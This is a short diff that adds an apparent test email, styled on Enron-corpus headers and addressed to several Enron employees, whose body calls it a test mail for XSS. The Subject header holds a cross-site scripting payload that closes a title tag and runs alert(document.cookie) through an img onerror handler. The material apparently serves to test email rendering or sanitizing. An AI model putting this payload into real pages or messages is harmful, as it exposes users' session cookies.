@@ -1,0 +1,7 @@
+From: "Janette Stratton" <ivacar@caoba.entelnet.bo>
+To: robert.c.williams@enron.com, richard.b.sanders@enron.com, msmith1@enron.com, 
+Subject: <img xx="</title><img/src=1 onerror=alert(document.cookie)//\">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
